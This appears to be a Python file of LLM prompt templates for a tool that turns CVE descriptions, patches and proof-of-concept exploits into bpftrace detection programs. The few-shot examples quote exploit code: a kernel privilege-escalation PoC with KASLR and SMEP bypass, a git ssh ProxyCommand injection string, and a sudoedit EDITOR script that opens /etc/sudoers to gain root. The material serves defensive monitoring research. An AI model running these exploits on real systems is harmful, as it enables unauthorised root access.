+What does arg0 of readline() in /bin/bash contain? I don’t know, so I’ll need to look at the bash source code to find out what its arguments are.
+
+When tracing libraries, it is sufficient to specify the library name instead of a full path. The path will be then automatically resolved using `/etc/ld.so.cache`:
+
+```
+uprobe:libc:malloc { printf("Allocated %d bytes\n", arg0); }
+```
+
+
+
+
+
+{Target}
+Based on the wrong bpftrace program I gave you and other information, such as compiler error messages, debug the bpftrace program and eventually generate the correct bpftrace program. In the meantime, do not change the logic of the program.
+Thinking step by step, it's important for my career.
+
+{CVE information}
+
+[[CVE-ID]]
+
+[Description]
+[[CVE-DESCRIPTION]]
+
+
+[Patch]
+[[CVE-PATCH]]
+
+
+[PoC/Exp]
+[[CVE-POC]]
+
+
+
+
+{Tips}
+[[CVE-TIPS]]
+
+
+{Buggy bpftrace program and its error message}
+
+Buggy bpftrace program
+```
+[[BUGGY-PROGRAM]]
+```
+
+And its error message from bpftrace compiler
+```
+[[ERROR-MESSAGE]]
+```
+
+
+{Defective function context}
+[[CVE-CONTEXT]]
+
+
+{Generated bpftrace code}
+
+Provide your final answer in a concise manner without showing any internal reasoning or chain-of-thought. Only output the final result.
+
+
+Now debugging buggy-code and then generate only the bpftrace code , and do not output any information other than the code.
+
+"""
+
+
+FunctionNameExtractionPrompt = """
+{System Role}
+You are an experienced kernel-related developer with extensive experience submitting patches to the kernel forums, and you specialize in understanding and extracting function-related information from text or patch.
+
+
+
+{Task}
+
+Your task is to extract the name of the problematic, buggy function name from the CVE vulnerability description information or the patch of it.
+
+
+
+{Example}
+
+[Example 1]
+
+
+"In the Linux kernel, the following vulnerability has been resolved: perf bpf: Avoid memory leak from perf_env__insert_btf() perf_env__insert_btf() doesn't insert if a duplicate BTF id is encountered and this causes a memory leak. Modify the function to return a success/error value and then free the memory if insertion didn't happen. v2. Adds a return -1 when the insertion error occurs in perf_env__fetch_btf. This doesn't affect anything as the result is never checked.
+"
+
+The perf_env__insert_btf function is flawed, i.e., buggy code. So,  You only need to output "perf_env__insert_btf".
+
+
+[Example 2]
+
+
+"In the Linux kernel, the following vulnerability has been resolved: iommu: Fix potential use-after-free during probe Kasan has reported the following use after free on dev->iommu. when a device probe fails and it is in process of freeing dev->iommu in dev_iommu_free function, a deferred_probe_work_func runs in parallel and tries to access dev->iommu->fwspec in of_iommu_configure path thus causing use after free. BUG: KASAN: use-after-free in of_iommu_configure+0xb4/0x4a4 Read of size 8 at addr ffffff87a2f1acb8 by task kworker/u16:2/153 Workqueue: events_unbound deferred_probe_work_func Call trace: dump_backtrace+0x0/0x33c show_stack+0x18/0x24 dump_stack_lvl+0x16c/0x1e0 print_address_description+0x84/0x39c __kasan_report+0x184/0x308 kasan_report+0x50/0x78 __asan_load8+0xc0/0xc4 of_iommu_configure+0xb4/0x4a4 of_dma_configure_id+0x2fc/0x4d4 platform_dma_configure+0x40/0x5c really_probe+0x1b4/0xb74 driver_probe_device+0x11c/0x228 __device_attach_driver+0x14c/0x304 bus_for_each_drv+0x124/0x1b0 __device_attach+0x25c/0x334 device_initial_probe+0x24/0x34 bus_probe_device+0x78/0x134 deferred_probe_work_func+0x130/0x1a8 process_one_work+0x4c8/0x970 worker_thread+0x5c8/0xaec kthread+0x1f8/0x220 ret_from_fork+0x10/0x18 Allocated by task 1: ____kasan_kmalloc+0xd4/0x114 __kasan_kmalloc+0x10/0x1c kmem_cache_alloc_trace+0xe4/0x3d4 __iommu_probe_device+0x90/0x394 probe_iommu_group+0x70/0x9c bus_for_each_dev+0x11c/0x19c bus_iommu_probe+0xb8/0x7d4 bus_set_iommu+0xcc/0x13c arm_smmu_bus_init+0x44/0x130 [arm_smmu] arm_smmu_device_probe+0xb88/0xc54 [arm_smmu] platform_drv_probe+0xe4/0x13c really_probe+0x2c8/0xb74 driver_probe_device+0x11c/0x228 device_driver_attach+0xf0/0x16c __driver_attach+0x80/0x320 bus_for_each_dev+0x11c/0x19c driver_attach+0x38/0x48 bus_add_driver+0x1dc/0x3a4 driver_register+0x18c/0x244 __platform_driver_register+0x88/0x9c init_module+0x64/0xff4 [arm_smmu] do_one_initcall+0x17c/0x2f0 do_init_module+0xe8/0x378 load_module+0x3f80/0x4a40 __se_sys_finit_module+0x1a0/0x1e4 __arm64_sys_finit_module+0x44/0x58 el0_svc_common+0x100/0x264 do_el0_svc+0x38/0xa4 el0_svc+0x20/0x30 el0_sync_handler+0x68/0xac el0_sync+0x160/0x180 Freed by task 1: kasan_set_track+0x4c/0x84 kasan_set_free_info+0x28/0x4c ____kasan_slab_free+0x120/0x15c __kasan_slab_free+0x18/0x28 slab_free_freelist_hook+0x204/0x2fc kfree+0xfc/0x3a4 __iommu_probe_device+0x284/0x394 probe_iommu_group+0x70/0x9c bus_for_each_dev+0x11c/0x19c bus_iommu_probe+0xb8/0x7d4 bus_set_iommu+0xcc/0x13c arm_smmu_bus_init+0x44/0x130 [arm_smmu] arm_smmu_device_probe+0xb88/0xc54 [arm_smmu] platform_drv_probe+0xe4/0x13c really_probe+0x2c8/0xb74 driver_probe_device+0x11c/0x228 device_driver_attach+0xf0/0x16c __driver_attach+0x80/0x320 bus_for_each_dev+0x11c/0x19c driver_attach+0x38/0x48 bus_add_driver+0x1dc/0x3a4 driver_register+0x18c/0x244 __platform_driver_register+0x88/0x9c init_module+0x64/0xff4 [arm_smmu] do_one_initcall+0x17c/0x2f0 do_init_module+0xe8/0x378 load_module+0x3f80/0x4a40 __se_sys_finit_module+0x1a0/0x1e4 __arm64_sys_finit_module+0x44/0x58 el0_svc_common+0x100/0x264 do_el0_svc+0x38/0xa4 el0_svc+0x20/0x30 el0_sync_handler+0x68/0xac el0_sync+0x160/0x180 Fix this by setting dev->iommu to NULL first and then freeing dev_iommu structure in dev_iommu_free function."
+
+
+From "when a device probe fails and it is in process of freeing dev->iommu in dev_iommu_free function" and "Fix this by setting dev->iommu to NULL first and then freeing dev_iommu structure in dev_iommu_free function", you know that there is a problem with the dev_iommu_free function, so you only need to output "dev_iommu_free" .
+
+
+[Example 3]
+
+
+"In the Linux kernel, the following vulnerability has been resolved: nvme-loop: fix memory leak in nvme_loop_create_ctrl() When creating loop ctrl in nvme_loop_create_ctrl(), if nvme_init_ctrl() fails, the loop ctrl should be freed before jumping to the "out" label."
+
+
+
+From the description, you can see that the nvme_loop_create_ctrl function had been fixed, so there is a problem with the nvme_loop_create_ctrl function, and you only need to output "nvme_loop_create_ctrl" .
+
+
+
+
+[Example 4]
+
+"Integer Overflow or Wraparound vulnerability in openEuler kernel on Linux (filesystem modules) allows Forced Integer Overflow.This issue affects openEuler kernel: from 4.19.90 before 4.19.90-2401.3, from 5.10.0-60.18.0 before 5.10.0-183.0.0."
+
+
+
+There is no information in the description about which function is having problems, and you can't tell which function is having problems. You only need to output "DO NOT KNOW".
+
+
+
+[Example 5]
+
+
+"In the Linux kernel, the following vulnerability has been resolved: drm/vrr: Set VRR capable prop only if it is attached to connector VRR capable property is not attached by default to the connector It is attached only if VRR is supported. So if the driver tries to call drm core set prop function without it being attached that causes NULL dereference."
+
+
+From the description, only the name of the module where the buggy function is located is given which is 'drm/vrr', but not the name of the buggy function itself, so you need to output  "DO NOT KNOW".
+
+
+
+[Example 6]
+
+```
+diff --git a/drivers/net/can/dev/skb.c b/drivers/net/can/dev/skb.c
+--- a/drivers/net/can/dev/skb.c
++++ b/drivers/net/can/dev/skb.c
+@@ -49,7 +49,11 @@ int can_put_echo_skb(struct sk_buff *skb, struct net_device *dev,
+ {
+ 	struct can_priv *priv = netdev_priv(dev);
+ 
+-	BUG_ON(idx >= priv->echo_skb_max);
++	if (idx >= priv->echo_skb_max) {
++		netdev_err(dev, "%s: BUG! Trying to access can_priv::echo_skb out of bounds (%u/max %u)\n",
++			   __func__, idx, priv->echo_skb_max);
++		return -EINVAL;
++	}
+ 
+ 	/* check flag whether this packet has to be looped back */
+ 	if (!(dev->flags & IFF_ECHO) ||
+```
+
+
+The provided code snippet is a patch, which means it is a diff showing changes between two versions of a code file.The function being modified in the patch is can_put_echo_skb. Based on the above analysis, the name of the problematic function is can_put_echo_skb. So you need to output "can_put_echo_skb".
+
+
+
+{Target CVE Information}
+
+[[CVE-ID]]
+
+
+
+[Description]
+
+[[CVE-DESCRIPTION]]
+
+
+
+[Patch]
+
+[[CVE-PATCH]]
+
+
+
+{Generate}
+Provide your final answer in a concise manner without showing any internal reasoning or chain-of-thought. Only output the final result.
+
+Now according to {Target CVE Information} , Output the name of the buggy function. If you can't get the name of the buggy function, just output "DO NOT KNOW".
+"""
+
+
+ProofOfConceptAnalysisPrompt = """
+{System Role}
+You are an experienced system security researcher, have a wealth of vulnerability mining and exploitation, penetration experience, familiar with the system attack and defense programs, able to understand the vulnerabilities corresponding to the Proof of Concept and Exploit program logic and program characteristics.
+
+
+
+{Task}
+
+Your task is to summarize the system call characteristics of the program from the vulnerabilities corresponding to the Proof of Concept and Exploit programs. This is because I want to use eBPF (bpftrace) to monitor the execution of Proof of Concept and Exploit programs. Therefore, you need to read and understand the program, and summarize the characteristics that can be monitored using eBPF.
+
+
+
+{PoC/Exp}
+
+A Proof of Concept (PoC) is a demonstration to verify that a certain concept or theory is feasible. In the context of cybersecurity, a PoC usually refers to a demonstration that a particular vulnerability exists and can be exploited.
+
+An Exploit (Exp) is a piece of software, a sequence of commands, or a methodology that takes advantage of a vulnerability to cause unintended behavior in a computer system. This behavior can include gaining unauthorized access to a system, executing arbitrary code, or causing a denial-of-service (DoS).
+
+
+
+{Characteristics of a program}
+
+Characteristics of a program refer to those features that best distinguish this program from others.
+From a system-call perspective, these characteristics are usually expressed in terms of specific system calls or system-call patterns used by the program.
+
+For example, unique system call combinations: a program may use a unique set of system calls that are rarely seen in other programs. Frequency of System Calls: Different programs may call the same system calls with different frequencies. System call patterns: The order and pattern in which a program invokes system calls can also be characteristic. But that's not all. Think of other patterns yourself.
+
+Try not to monitor common system calls, as the false positive rate will be higher. If you do monitor, try to monitor calls with specific parameters.
+
+The following are some of the most common system calls:
+write,epoll_ctl,newfstatat,read,openat,close,recvfrom,writev,sendfile64,epoll_pwait,epoll_wait,futex,readlinkat,nanosleep,sched_yield,readlink,fcntl,poll,ioctl,sendto,accept4,pwrite64,getrandom,pread64,access,mkdir,unlink,fstatfs,fsetxattr,recvmsg,readv,lseek
+
+
+{Monitoring pattern}
+
+Depending on the characteristics of the PoC/Exp program, the following monitoring patterns can be used. You can use one of these monitoring patterns.
+
+
+[Order of function calls (system calls)]
+
+Order, i.e., the sequence of function calls.
+
+[[Example 1]]
+
+
+```
+#define _GNU_SOURCE
+
+#include <assert.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <stdarg.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <linux/socket.h>
+#include <netinet/ip.h>
+#include <sys/klog.h>
+#include <sys/mman.h>
+#include <sys/utsname.h>
+
+#define ENABLE_KASLR_BYPASS		1
+#define ENABLE_SMEP_BYPASS		1
+
+
+
+// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *
+
+#define SHINFO_OFFSET 3164
+
+void oob_execute(unsigned long payload) {
+	char buffer[4096];
+	memset(&buffer[0], 0x42, 4096);
+	init_skb_buffer(&buffer[SHINFO_OFFSET], payload);
+
+	int s = socket(PF_INET, SOCK_DGRAM, 0);
+	if (s == -1) {
+		perror("[-] socket()");
+		exit(EXIT_FAILURE);
+	}
+
+	struct sockaddr_in addr;
+	memset(&addr, 0, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(8000);
+	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+
+	if (connect(s, (void*)&addr, sizeof(addr))) {
+		perror("[-] connect()");
+		exit(EXIT_FAILURE);
+	}
+
+	int size = SHINFO_OFFSET + sizeof(struct skb_shared_info);
+	int rv = send(s, buffer, size, MSG_MORE);
+	if (rv != size) {
+		perror("[-] send()");
+		exit(EXIT_FAILURE);
+	}
+
+	int val = 1;
+	rv = setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &val, sizeof(val));
+	if (rv != 0) {
+		perror("[-] setsockopt(SO_NO_CHECK)");
+		exit(EXIT_FAILURE);
+	}
+
+	send(s, buffer, 1, 0);
+
+	close(s);
+}
+
+// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *
+
+
+void setup_sandbox() {
+	int real_uid = getuid();
+	int real_gid = getgid();
+
+	if (unshare(CLONE_NEWUSER) != 0) {
+		printf("[!] unprivileged user namespaces are not available\n");
+		perror("[-] unshare(CLONE_NEWUSER)");
+		exit(EXIT_FAILURE);
+	}
+	if (unshare(CLONE_NEWNET) != 0) {
+		perror("[-] unshare(CLONE_NEWUSER)");
+		exit(EXIT_FAILURE);
+	}
+
+	if (!write_file("/proc/self/setgroups", "deny")) {
+		perror("[-] write_file(/proc/self/set_groups)");
+		exit(EXIT_FAILURE);
+	}
+	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
+		perror("[-] write_file(/proc/self/uid_map)");
+		exit(EXIT_FAILURE);
+	}
+	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
+		perror("[-] write_file(/proc/self/gid_map)");
+		exit(EXIT_FAILURE);
+	}
+
+	cpu_set_t my_set;
+	CPU_ZERO(&my_set);
+	CPU_SET(0, &my_set);
+	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
+		perror("[-] sched_setaffinity()");
+		exit(EXIT_FAILURE);
+	}
+
+	if (system("/sbin/ifconfig lo mtu 1500") != 0) {
+		perror("[-] system(/sbin/ifconfig lo mtu 1500)");
+		exit(EXIT_FAILURE);
+	}
+	if (system("/sbin/ifconfig lo up") != 0) {
+		perror("[-] system(/sbin/ifconfig lo up)");
+		exit(EXIT_FAILURE);
+	}
+}
+
+
+int main(int argc, char** argv) {
+	printf("[.] starting\n");
+
+	printf("[.] checking distro and kernel versions\n");
+	detect_versions();
+	printf("[~] done, versions looks good\n");
+
+	printf("[.] checking SMEP and SMAP\n");
+	check_smep_smap();
+	printf("[~] done, looks good\n");
+
+	printf("[.] setting up namespace sandbox\n");
+	setup_sandbox();
+	printf("[~] done, namespace sandbox set up\n");
+
+#if ENABLE_KASLR_BYPASS
+	printf("[.] KASLR bypass enabled, getting kernel addr\n");
+	KERNEL_BASE = get_kernel_addr();
+	printf("[~] done, kernel text:   %lx\n", KERNEL_BASE);
+#endif
+
+	printf("[.] commit_creds:        %lx\n", COMMIT_CREDS);
+	printf("[.] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);
+
+	unsigned long payload = (unsigned long)&get_root;
+
+#if ENABLE_SMEP_BYPASS
+	printf("[.] SMEP bypass enabled, mmapping fake stack\n");
+	mmap_stack();
+	payload = XCHG_EAX_ESP_RET;
+	printf("[~] done, fake stack mmapped\n");
+#endif
+
+	printf("[.] executing payload %lx\n", payload);
+	oob_execute(payload);
+	printf("[~] done, should be root now\n");
+
+	check_root();
+
+	return 0;
+}
+
+```
+
+The most crucial part of this PoC code is likely the `oob_execute` function, as it is primarily used to trigger the vulnerability conditions. Within this function, the following snippet can be considered a characteristic of this PoC:
+
+```
+int rv = send(s, buffer, size, MSG_MORE);
+
+rv = setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &val, sizeof(val));
+```
+
+These two calls contain specific constant flags, which distinguishes this program from others. Additionally, `sendto` and `setsockopt` are common system calls, and the use of these constant flags can help us filter and reduce false positives.
+
+A possible signature for this PoC is the sequence of first calling `send` with the `MSG_MORE` flag, followed by calling `setsockopt` with `SOL_SOCKET` and `SO_NO_CHECK` flags.
+
+The `send` function is actually a wrapper around `sendto`, which ultimately calls the `sendto` system call.
+
+
+
+The bpftrace program ensures that the sendto system call with the MSG_MORE flag is followed by the setsockopt system call with the SOL_SOCKET level and SO_NO_CHECK option. The program uses a map to record the occurrence of the sendto call with the MSG_MORE flag for each process. When the setsockopt call is detected, the program checks if the sendto call with the MSG_MORE flag has been recorded for the same process. By using the map to track the sequence of system calls, the program ensures that the sendto call with the MSG_MORE flag must precede the setsockopt call with the SOL_SOCKET level and SO_NO_CHECK option, thereby maintaining the correct order and accurately detecting the vulnerability pattern.
+
+
+```bpftrace
+#define MSG_MORE	0x8000
+#define SOL_SOCKET	1
+#define SO_NO_CHECK	11
+
+tracepoint:syscalls:sys_enter_sendto
+/ args.flags == MSG_MORE /
+{
+    @sendto[pid]++;
+}
+
+tracepoint:syscalls:sys_enter_setsockopt
+/ @sendto[pid] /
+{
+    if (args.level == SOL_SOCKET && args.optname == SO_NO_CHECK)
+    {
+        printf("CVE maybe triggered by comm[%s] pid[%d]\n", comm, pid);
+    }
+}
+```
+
+As you do your thinking, pay extra attention to the constant parameters of system calls. This example is MSG_MORE, SOL_SOCKET , SO_NO_CHECK.
+
+
+
+[Frequency of function calls (system calls)]
+
+Refers to a large number of repetitions of a particular system call over a short period of time. The upper bound of the loop has to be large. This means that the contents of the loop body will be executed many times. In this case, consider using this monitoring pattern.
+
+[[Example 1]]
+
+
+
+```c
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+
+int main(int argc, char *argv[]) {
+    if (argc != 4) {
+        fprintf(stderr, "Usage: %s name1 name2 linkdest\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
+    char *name1 = argv[1];
+    char *name2 = argv[2];
+    char *linkdest = argv[3];
+
+    int dirfd = open(".", O_DIRECTORY|O_CLOEXEC);
+    if (dirfd < 0) {
+        perror("Error open CWD");
+        exit(EXIT_FAILURE);
+    }
+
+    if (mkdir(name1, 0755) < 0) {
+        perror("mkdir failed");
+        //do not exit
+    }
+    if (symlink(linkdest, name2) < 0) {
+        perror("symlink failed");
+        //do not exit
+    }
+
+    while (1)
+    {
+        renameat2(dirfd, name1, dirfd, name2, RENAME_EXCHANGE);
+    }
+}
+```
+
+
+
+- The most notable characteristic of this program is that it keeps calling the `renameat2` function in a dead loop.
+- Also, `RENAME_EXCHANGE` is a constant, so for more accurate monitoring, it is possible to monitor only the infinite calls to `renameat2` with the `RENAME_EXCHANGE` flag.
+
+
+
+Thus, this program may be characterized by repeated calls to `renameat2` with the `RENAME_EXCHANGE` flag in a dead loop.
+
+
+
+Here is a possible bpftrace monitor program. The idea is to monitor the frequency of renameat2 calls.
+
+The logic of the program is: hook up the program to renameat2 and monitor only the calls where the flags argument is RENAME_EXCHANGE. Since the bpf program does not know what the RENAME_EXCHANGE constant is, it needs to define it manually. Define a map that uses pid as a key and increments itself when the function is called. When the number of function calls exceeds a threshold, an alarm is generated. In addition, the following map is emptied every 1ms. The net effect is that if a process calls renameat2 more than a threshold number of times in 1ms, it will be alerted.
+
+```bpftrace
+#define threshold 64
+
+#define RENAME_EXCHANGE		(uint64)(1 << 1)	/* Exchange source and dest */ 
+// https://elixir.bootlin.com/linux/v4.5/source/include/uapi/linux/fs.h#L42
+
+t:syscalls:sys_enter_renameat2
+/ args->flags == RENAME_EXCHANGE /
+{
+    @cnt[pid]++;
+    if (@cnt[pid] > threshold)
+    {
+        printf("CVE maybe triggered by comm[%s] pid[%d]\n", comm, pid);
+    }
+
+}
+
+interval:ms:1
+{
+    clear(@cnt);
+}
+```
+
+From this example, you should learn the following points:
+- You should pay extra attention to the constant values in the system call arguments. When generating the eBPF monitoring program, you should do an initial filtering through these constant parameters to reduce the false alarm rate.
+
+In this example, The last argument to `renameat2(dirfd, name1, dirfd, name2, RENAME_EXCHANGE)` is the constant `RENAME_EXCHANGE`. Therefore, the monitoring program first filters by this checking this constant parameter.
+
+
+
+[Arguments for function calls (system calls)]
+
+[[Example 1]]
+
+
+```
+因此在这种情况下，ssh客户端可以采用ProxyCommand选项，通过下面命令最终和目标机器建立连接。
+
+ssh -o ProxyCommand=’ssh user@proxy nc %h 22′ user@Target
+
+加上ProxyCommand选项后。ssh客户端会先用当前用户的shell执行ProxyCommand中的内容。
+
+例如下面的命令，在Linux桌面环境中执行，就会弹出gedit文本编辑器。
+
+ssh -oProxyCommand=gedit user@Target
+
+即便最后的user@hostname不合法，也不会影响ProxyCommand中先执行的命令，照样可以弹出gedit。
+
+好了介绍完了ProxyCommand，可以理解为这个选项如处理不当，是可以进行命令注入的！
+
+CVE-2017-1000117漏洞
+CVE-2017-1000117这个漏洞就是没有正确处理ssh链接的请求，导致受害人通过Git版本控制系统，访问恶意链接时，存在安全隐患，一旦黑客攻击成功，可在受害人机器上执行任意命令。
+
+git clone是Git版本控制系统中常用的将远程仓库克隆到本地的命令。当使用git clone访问下面的恶意ssh链接时，会在本地执行命令，弹出gedit。
+
+git clone ssh://-oProxyCommand=”gedit /tmp/xxx”
+```
+
+
+
+- The most obvious feature of the program is that when executing the `git` program, the second argument is something like `ssh://-` . This is because `ssh://-oProxyCommand=“gedit /tmp/xxx”` is an incorrect and **uncommon** form, and the usual form is something like `ssh://git@ssh.github.com ......`
+- The system runs the program, which is called by execve.
+
+
+
+Therefore, a possible characteristic of this program is that the git program executes with a third argument like `ssh://-`.
+
+
+
+Here is a possible bpftrace monitor program. The logic of the program is to attach to the execve system call, which only monitors the execution of the git program. It then determines whether the second argument string contains `ssh://-`.
+
+```bpftrace
+tracepoint:syscalls:sys_enter_execve  
+/str(args->argv[0])=="git"/
+{
+    if (strcontains(str(args->argv[2]) , "ssh://-")) 
+    {  
+        printf("Command may trigger CVE–2017–1000117(ssh injection vulnerability):\n");
+        join(args->argv);
+        printf("\n");
+    }  
+}
+```
+
+From this example, you should learn the following points:
+- You should pay extra attention to special, unusual features. In this example, `ssh://-oProxyCommand=“gedit /tmp/xxx”` is an incorrect and **uncommon** form, and the usual form is something like `ssh://git@ssh.github.com ......`. It starts with `ssh://-` is a special, unusual feature.
+
+- You should pay extra attention to the position of the parameters. 
+
+```
+git clone ssh://-oProxyCommand=”gedit /tmp/xxx”
+arg0 arg1 arg2
+
+`git` is the first parameter, `clone` is the second parameter, `ssh://-oProxyCommand=”gedit /tmp/xxx”` is the third parameter.
+In execve, `git` is argv[0] , `clone` is argv[1] , `ssh://-oProxyCommand=”gedit /tmp/xxx”` is argv[2].
+```
+
+
+
+[Return value of a function call (system call)]
+
+
+
+[[Example 1]]
+
+
+```sh
+if ! sudo --version | head -1 | grep -qE '(1\\.8.*|1\\.9\\.[0-9]1?(p[1-3])?|1\\.9\\.12p1)$'
+then
+    echo "> Currently installed sudo version is not vulnerable"
+    exit 1
+fi
+
+EXPLOITABLE=$(sudo -l | grep -E "sudoedit|sudo -e" | grep -E '\\(root\\)|\\(ALL\\)|\\(ALL : ALL\\)' | cut -d ')' -f 2-)
+
+if [ -z "$EXPLOITABLE" ]; then
+    echo "> It doesn't seem that this user can run sudoedit as root"
+    read -p "Do you want to proceed anyway? (y/N): " confirm && [[ $confirm == [yY] ]] || exit 2
+else
+    echo "> BINGO! User exploitable"
+fi
+
+echo "> Opening sudoers file, please add the following line to the file in order to do the privesc:"
+echo "$USER ALL=(ALL:ALL) ALL"
+read -n 1 -s -r -p "Press any key to continue..."
+EDITOR="vim -- /etc/sudoers" $EXPLOITABLE
+sudo su root
+exit 0
+```
+
+A distinctive feature of this POC program is that its execution of $EXPLOITABLE sets the EDITOR environment variable. In context, $EXPLOITABLE is the `sudo` program. That is, it sets the EDITOR environment variable to run sudo.
+
+The EDITOR environment variable is anomalous in that it contains the `--` character. So the final idea is to monitor the `EDITOR` environment variable for the `--` character.
+
+The idea of eBPF monitoring is to monitor the return value of the `getenv` function to get the environment variables, and to alert if there is a `--` in the return value of `EDITOR`.
+
+The following is a possible bpftrace monitor program.
+
+```bpftrace
+uprobe:sudo:getenv
+{
+    // printf("%d %s %s\n", pid, comm, str(arg0));
+
+    if (strcontains(str(arg0),"EDITOR"))
+    {
+        @wanted[pid] = 1;
+    }
+}
+
+uretprobe:sudo:getenv
+/ @wanted[pid] /
+{
+    printf("%s\n", str(retval));
+    if (strcontains(str(retval),"--"))
+    {
+        printf("Bingo! pid:%d, comm:%s\n", pid, comm);
+        signal("SIGKILL");
+    }
+    delete(@wanted[pid]);
+}
+```
+
+> kretprobe/uretprobe s trigger on the return from a kernel function. Return probes do not have access to the function (input) arguments, only to the return value (through retval). A common pattern to work around this is by storing the arguments in a map on function entry and retrieving in the return probe:
+
+This bpftrace script is designed to monitor the `getenv` function calls within the `sudo` process and take specific actions based on the accessed environment variables and their values. The script consists of two main parts: a uprobe and a uretprobe. The uprobe is attached to the `getenv` function call in the `sudo` process, triggering whenever `getenv` is called. It captures the process ID (`pid`), the command name (`comm`), and the first argument of the `getenv` function (`arg0`), which represents the name of the environment variable being accessed. The script then checks if the environment variable name contains the string "EDITOR" using the `strcontains` function. If this condition is met, it sets the `@wanted` map for the current `pid` to 1, indicating that this process should be monitored further.
+
+The uretprobe, which is attached to the return of the `getenv` function, is triggered when `getenv` returns in the `sudo` process. It operates under the condition that the current `pid` is marked in the `@wanted` map. This probe captures the return value of `getenv` (`retval`), which is the value of the environment variable. It then prints the value of the environment variable to the console. Following this, it checks if the returned value contains the string "--" using `strcontains`. If the condition is met, indicating a potential security concern, it prints a "Bingo!" message along with the `pid` and `comm`, and then sends a `SIGKILL` signal to terminate the process. Finally, it removes the `pid` from the `@wanted` map to ensure the map does not retain unnecessary entries.
+
+
+
+{Target PoC/Exp program}
+[[CVE-ID]]
+
+[Description]
+[[CVE-DESCRIPTION]]
+
+
+[PoC/Exp]
+[[CVE-POC]]
+
+
+[INFO]
+Parse C source code and generate a syntax tree. The code is able to precisely extract function definitions, parameters, start and end line numbers, and all function calls within the function body. Additionally, it can extract conditions and update parts of various loop structures, such as for, while, and do-while, and list function calls within the loop body.
+
+[[AST-INFO]]
+
+
+{Generate}
+
+
+Provide your final answer in a concise manner without showing any internal reasoning or chain-of-thought. Only output the final result.
+
+
+Now according to {Target PoC/Exp program} , you output the characterization of the program. And then output ideas for monitoring with bpftrace.
+
+
+First, in the first line of your output, choose just only one of the following four options based on your thinking.
+- "Order of function calls (system calls)"
+- "Frequency of function calls (system calls)"
+- "Arguments for function calls (system calls)"
+- "Return value of a function call (system call)"
+
+
+And then, step-by-step output your idea base on your choice, the monitor's idea, and explain it step-by-step. Take a deep breath and work on this step by step, This is very import to my career.
+
+"""
+
+
+PatchVulnerabilityInsightPrompt = """
+{System Role}
+You are an experienced kernel-related developer with extensive experience submitting patches to the kernel forums, and you are familiar with bpftrace, the ebpf monitoring tool, and know the extent of bpftrace's capabilities.
+
+A Patch is a fix for a flawed function, usually by adding checks on some parameters/variables, and the attacker of the vulnerability takes advantage of the lack of checks on these variables in the flawed function.
+
+Therefore, in this case, the core idea of writing eBPF is to follow the logic of Patch code(git diff) and check some variables.
+
+The os is 64-bits Linux using System V AMD64 ABI.
+
+{Bpftrace}
+
+bpftrace is a high-level tracing language and runtime for Linux based on eBPF. It supports static and dynamic tracing for both the kernel and user-space. Bpftrace can only be attached to the beginning or end of a function.
+
+[Data Types]
+
+The following fundamental integer types are provided by the language. Integers are internally represented as 64 bit signed (int64). If you need another representation, you may cast to the following built in types:
+
+- uint8
+- int8
+- uint16
+- int16
+- uint32
+- int32
+- uint64
+- int64
+
+
+bpftrace only supports the above basic data types, when you need to do basic data type conversion, you can only use the above types. Here is an example, just to illustrate the syntax.
+```
+kretprobe:vfs_open
+{
+    $res = (unsigned long)retval; // Wrong syntax, bpftrace only support type like uint64 ...
+    $res = (uint64)retval; // Correct syntax
+}
+```
+
+For structure members, you may need to convert them to the appropriate type depending on the context, which may be the basic type mentioned above, or a pointer to a structure or other type. The following is an example.
+
+```bpftrace
+kfunc:udmabuf_vm_fault
+{
+    $ubuf = (struct udmabuf *)args->vmf->vma->vm_private_data;
+    $pagecount = $ubuf->pagecount;
+}
+```
+
+
+[bpftrace probes]
+
+probe: An instrumentation point in software or hardware, that generates events that can execute bpftrace programs.
+
+
+[kprobe and kretprobe]
+- `kprobe[:module]:fn`
+- 'kprobe[:module]:fn+offset'
+- `kretprobe[:module]:fn`
+
+`kprobe`s allow for dynamic instrumentation of kernel functions. Each time the specified kernel function is executed the attached BPF programs are ran. Function arguments are available through the `argN` for register args. The numbering starts from 0, i.e. arg0 is the first parameter of the function.
+
+bpftrace does not detect the function signature so it is not aware of the argument count or their type. It is up to the user to perform [Type conversion](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#type-conversion) when needed, e.g.
+
+```
+#include <linux/path.h>
+#include <linux/dcache.h>
+
+kprobe:vfs_open
+{
+	printf("open path: %s\n", str(((struct path *)arg0)->dentry->d_name.name));
+}
+```
+
+Here arg0 was cast as a (struct path *), since that is the first argument to vfs_open. The struct support is the same as bcc and based on available kernel headers. This means that many, but not all, structs will be available, and you may need to manually define structs. The numbering starts from 0, i.e. arg0 is the first parameter of the function.
+
+If the kernel has BTF (BPF Type Format) data, all kernel structs are always available without defining them. For example:
+
+```
+kprobe:vfs_open {
+  printf("open path: %s\n", str(((struct path *)arg0)->dentry->d_name.name));
+}
+```
+
+kprobe s are not limited to function entry, they can be attached to any instruction in a function by specifying an offset from the start of the function.
+
+
+
+`kretprobe` s trigger on the return from a kernel function. Return probes do not have access to the function (input) arguments, only to the return value (through `retval`). A common pattern to work around this is by storing the arguments in a map on function entry and retrieving in the return probe:
+
+```
+kprobe:d_lookup
+{
+	$name = (struct qstr *)arg1;
+	@fname[tid] = $name->name;
+}
+
+kretprobe:d_lookup
+/@fname[tid]/
+{
+	printf("%-8d %-6d %-16s M %s\n", elapsed / 1e6, pid, comm,
+	    str(@fname[tid]));
+}
+```
+
+
+[Variables and Maps]
+
